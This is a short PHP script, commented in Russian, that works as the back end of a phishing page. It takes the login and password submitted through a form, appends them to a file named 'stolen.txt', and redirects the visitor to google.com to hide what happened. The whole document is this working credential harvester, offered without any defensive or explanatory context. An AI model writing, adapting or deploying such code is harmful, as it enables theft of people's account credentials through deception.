<?php
// Получаем данные из формы
$login = $_POST['login'];
$password = $_POST['password'];

// Просто сохраняем в файл
$data = "Login: $login\nPassword: $password\n\n";
file_put_contents('stolen.txt', $data, FILE_APPEND);

// Перенаправляем куда-то
header('Location: https://google.com');
exit();
?>